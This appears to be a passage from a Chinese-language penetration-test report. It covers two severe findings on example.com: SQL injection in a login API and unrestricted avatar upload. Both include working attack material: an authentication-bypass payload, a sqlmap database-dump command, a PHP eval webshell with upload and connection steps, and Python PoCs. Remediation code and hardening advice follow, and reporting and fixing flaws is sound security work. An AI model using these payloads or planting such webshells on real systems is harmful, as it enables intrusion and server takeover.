3. 漏洞详情

VULN-2024-001 - 登录接口SQL注入漏洞
CVSS 9.8
漏洞类型：SQL注入
风险等级：严重
CVSS评分：9.8/10.0
影响URL：https://example.com/api/login
影响参数：username
发现日期：2024-12-23

漏洞描述

在登录接口的username参数中发现SQL注入漏洞。攻击者可利用此漏洞绕过认证、获取数据库中所有用户数据。

危害分析：攻击者可无需认证直接获取数据库全部数据，并可进一步利用数据库权限执行操作系统命令。

CVSS 3.1 评分详情

指标值说明
攻击向量 (AV)N网络
攻击复杂度 (AC)L低
所需权限 (PR)N无
用户交互 (UI)N无
影响范围 (S)U不变
机密性影响 (C)H高
完整性影响 (I)H高
可用性影响 (A)H高

CVSS向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

复现步骤

前置条件：

  • 目标系统可网络访问
  • 存在登录接口
1
访问登录接口

使用Burp Suite拦截登录请求

POST /api/login HTTP/1.1 Host: example.com username=admin&password=test
2
注入SQL Payload

在username参数中插入SQL注入Payload

username=admin' OR '1'='1' --
3
SQLMap利用

使用SQLMap自动化获取数据库

sqlmap -u https://example.com/api/login --data='username=admin&password=test' --dbs

HTTP 请求原文

HTTPPOST /api/login HTTP/1.1 Host: example.com username=admin' OR '1'='1' --&password=test

HTTP 响应原文

HTTPHTTP/1.1 200 OK Set-Cookie: session=xxx {"status":"success","token":"admin_jwt"}

利用验证 (PoC)

pythonimport requests url = 'https://example.com/api/login' data = {'username': "admin' OR '1'='1' --", 'password': 'test'} r = requests.post(url, data=data) print(r.json())

修复方案

临时缓解措施（立即执行）

1. WAF添加SQL注入检测规则 2. 限制登录频率 3. 数据库用户降权

根本修复方案（推荐）

使用参数化查询替代字符串拼接。

修复前（存在漏洞的代码）：
pythonusername = request.form['username'] query = f"SELECT * FROM users WHERE username='{username}'" cursor.execute(query)
修复后（安全代码）：
pythonusername = request.form['username'] query = "SELECT * FROM users WHERE username=?" cursor.execute(query, (username,))
关键改动说明：
  1. 字符串拼接改为参数化查询
  2. 使用?占位符
  3. 参数以元组传入

配置加固建议

  • 使用ORM框架
  • 最小权限原则
  • 密码使用bcrypt哈希

修复验证方法

验证步骤：
  1. 使用原始Payload测试
  2. SQLMap扫描验证
  3. 代码审查确认

预期结果：注入Payload被当作普通字符串，返回'用户名或密码错误'。

参考资料

  • CWE-89
  • OWASP SQL Injection Prevention Cheat Sheet
VULN-2024-002 - 头像上传接口任意文件上传漏洞
CVSS 9.1
漏洞类型：文件上传
风险等级：严重
CVSS评分：9.1/10.0
影响URL：https://example.com/api/upload/avatar
影响参数：file
发现日期：2024-12-23

漏洞描述

头像上传接口未校验文件类型，可上传Webshell获取服务器控制权。

危害分析：攻击者可上传恶意脚本，获取服务器权限，横向移动攻击内网。

CVSS 3.1 评分详情

指标值说明
攻击向量 (AV)N网络
攻击复杂度 (AC)L低
所需权限 (PR)N无
用户交互 (UI)N无
影响范围 (S)U不变
机密性影响 (C)H高
完整性影响 (I)H高
可用性影响 (A)H高

CVSS向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

复现步骤

前置条件：

  • 存在文件上传功能
1
构造Webshell

创建PHP一句话木马

echo '<?php @eval($_POST[cmd]);?>' > shell.php
2
上传Webshell

通过接口上传

curl -F 'file=@shell.php' https://example.com/api/upload/avatar
3
连接Webshell

蚁剑/冰蝎连接

https://example.com/uploads/shell.php 密码:cmd

HTTP 请求原文

HTTPPOST /api/upload/avatar HTTP/1.1 Content-Type: multipart/form-data ...filename="shell.php"... <?php @eval($_POST[cmd]);?>

HTTP 响应原文

HTTPHTTP/1.1 200 OK {"url":"/uploads/shell.php"}

利用验证 (PoC)

pythonimport requests files = {'file': ('shell.php', '<?php @eval($_POST[cmd]);?>')} r = requests.post('https://example.com/api/upload/avatar', files=files) print(r.json())

修复方案

临时缓解措施（立即执行）

1. WAF拦截脚本后缀 2. 关闭上传功能

根本修复方案（推荐）

实施文件类型白名单校验，检测Magic Number，上传目录禁止脚本执行。

修复前（存在漏洞的代码）：
pythonfile = request.files['file'] file.save('/var/www/uploads/' + file.filename)
修复后（安全代码）：
pythonimport magic, uuid ALLOWED = {'jpg','png','gif'} file = request.files['file'] if file and file.filename.rsplit('.',1)[1].lower() in ALLOWED: mime = magic.from_buffer(file.read(2048), mime=True) if mime in {'image/jpeg','image/png','image/gif'}: file.seek(0) file.save('/var/www/uploads/' + uuid.uuid4().hex + '.jpg')
关键改动说明：
  1. 文件扩展名白名单
  2. MIME类型检测
  3. UUID重命名

配置加固建议

  • 上传目录禁止脚本执行
  • 限制文件大小
  • 病毒扫描

修复验证方法

验证步骤：
  1. 上传.php文件测试
  2. 上传含PHP代码的.jpg测试

预期结果：非图片文件被拒绝。

参考资料

  • CWE-434
  • OWASP File Upload Cheat Sheet
